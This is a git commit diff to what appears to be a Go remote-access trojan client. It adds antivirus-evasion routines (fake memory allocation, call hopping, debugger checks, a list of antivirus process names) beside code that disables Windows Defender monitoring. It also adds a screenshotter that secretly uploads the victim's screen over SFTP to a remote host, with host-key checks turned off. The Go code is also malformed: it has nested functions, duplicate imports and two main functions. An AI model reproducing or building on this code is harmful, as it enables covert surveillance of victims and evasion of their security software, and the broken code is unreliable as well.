a6c3f75f1cf0e4df3c5561ad6155f5b25aed1b32
spuqe <CryT0r@protonmail.com>
2020-10-10 00:13:26 +0300

    Updated client.
    Added an screenshotter which sends screenshots every 20 seconds using SFTP. Also upgraded AntiAV

--- client.go
+++ client.go
@@ -1,6 +1,9 @@
 package main
 
 import (
+	"github.com/vova616/screenshot"
+	"github.com/pkg/sftp"
+	"golang.org/x/crypto/ssh"
 	"bufio"
 	"fmt"
 	"net"
@@ -8,6 +11,12 @@ import (
 	"os/exec"
 	"strings"
 	"fmt"
+	"strings"
+	"log"
+	"bytes"
+	"image/png"
+	"fmt"
+	"time"
 )
 
 var connection net.Conn
@@ -31,6 +40,205 @@ func defender() {
     if err := c.Run(); err != nil { 
         c := exec.Command("powershell -command Set-MpPreference -DisableRealtimeMonitoring $true") // tries the same trick but using powershell
     }   
+}
+
+
+// Thank EgeBalci for this one x)
+func BypassAv() {
+	
+	var MagicNumber int64 = 0;  
+	
+	
+	func BypassAV(Rate int) {
+	  if Rate == 1 {
+		AllocateFakeMemory()
+	  }else if Rate == 2 {
+		AllocateFakeMemory()
+		Jump()
+	  }else if Rate == 3 {
+		AllocateFakeMemory()
+		Jump()
+		ProcessRecon()
+	  }else{
+	
+	  }
+	}
+	
+	
+	func Jump() {
+	  MagicNumber++
+	  hop1()
+	}
+	
+	func AllocateFakeMemory()  {
+	  for i := 0; i < 1000; i++ {
+		var Size int = 30000000
+		Buffer_1 := make([]byte, Size)
+		Buffer_1[0] = 1
+		var Buffer_2 [102400000]byte
+		Buffer_2[0] = 0
+	  }
+	}
+	
+	func CheckDebugger() {
+	  Flag,_,_ := IsDebuggerPresent.Call()
+	  if Flag != 0 {
+		//Debugger Active !!
+		CheckDebugger()
+	  }
+	}
+	
+	
+	func ProcessRecon() {
+		
+	  /* AVG
+		avgidsagenta.exe
+		avgcsrva.exe
+		avgwdsvca.exe
+		avgnsa.exe
+		avgemca.exe
+		avgrsa.exe
+	  */
+	
+	  /* ESET
+		egui.exe
+	  */
+	
+	  /* KASPERSKY
+		avpui.exe
+	  */
+	
+	
+	  /* NORTON
+		NS.exe
+	  */
+	
+	
+	}
+	
+	
+	func hop1() {
+	  MagicNumber++
+	  hop2()
+	}
+	func hop2() {
+	  MagicNumber++
+	  hop3()
+	}
+	func hop3() {
+	  MagicNumber++
+	  hop4()
+	}
+	func hop4() {
+	  MagicNumber++
+	  hop5()
+	}
+	func hop5() {
+	  MagicNumber++
+	  hop6()
+	}
+	func hop6() {
+	  MagicNumber++
+	  hop7()
+	}
+	func hop7() {
+	  MagicNumber++
+	  hop8()
+	}
+	func hop8() {
+	  MagicNumber++
+	  hop9()
+	}
+	func hop9() {
+	  MagicNumber++
+	  hop10()
+	}
+	func hop10() {
+	  MagicNumber++
+	}
+}
+
+	// send screenshot every 20 seconds using SFTP
+	func uploadscreenshot(imagestr []byte) { 
+		var (
+		err  error
+		sftpClient *sftp.Client
+		)
+		sftpClient, err = connect("Username", "Passwd", "IP/DNS", 1337)
+		if err != nil {
+		log.Fatal(err)
+		}
+		defer sftpClient.Close()
+	   
+		   // walk a directory
+		   w := sftpClient.Walk("/var")
+		   for w.Step() {
+			   if w.Err() != nil {
+				   continue
+			   }
+		   }
+	   
+	   
+		   fileloc := fmt.Sprintf("/var/img/%s.png",time.Now().Format(time.RFC850))
+		   fmt.Println(fileloc)
+		   f, err := sftpClient.Create(fileloc)
+		   if err != nil {
+			   log.Fatal(err)
+		   }
+		   if _, err := f.Write([]byte(imagestr)); err != nil {
+			   log.Fatal(err)
+		   }
+	   }
+	   
+	   func connect(user, password, host string, port int) (*sftp.Client, error) { 
+		var (
+		auth   []ssh.AuthMethod
+		addr   string
+		clientConfig *ssh.ClientConfig
+		sshClient *ssh.Client
+		sftpClient *sftp.Client
+		err   error
+		)
+		// get auth
+		auth = make([]ssh.AuthMethod, 0)
+		auth = append(auth, ssh.Password(password))
+	   
+		clientConfig = &ssh.ClientConfig{
+		User: user,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Auth: auth,
+		Timeout: 30 * time.Second,
+		}
+	   
+		addr = fmt.Sprintf("%s:%d", host, port)
+	   
+		if sshClient, err = ssh.Dial("tcp", addr, clientConfig); err != nil {
+		return nil, err
+		}
+		if sftpClient, err = sftp.NewClient(sshClient); err != nil {
+		return nil, err
+		}
+	   
+		return sftpClient, nil
+	   }
+	   
+		func main() {
+			takescreenshot()
+		   for t := range time.NewTicker(120 * time.Second).C {
+			   _ = t
+			   takescreenshot()
+		   }
+		}
+	   
+		func takescreenshot() {
+		   img, err := screenshot.CaptureScreen()
+				   if err != nil {
+				 
+			   }
+		   buf := new(bytes.Buffer)
+		   png.Encode(buf,img)
+		   uploadscreenshot(buf.Bytes())
+		}
 }
 
 func main() {
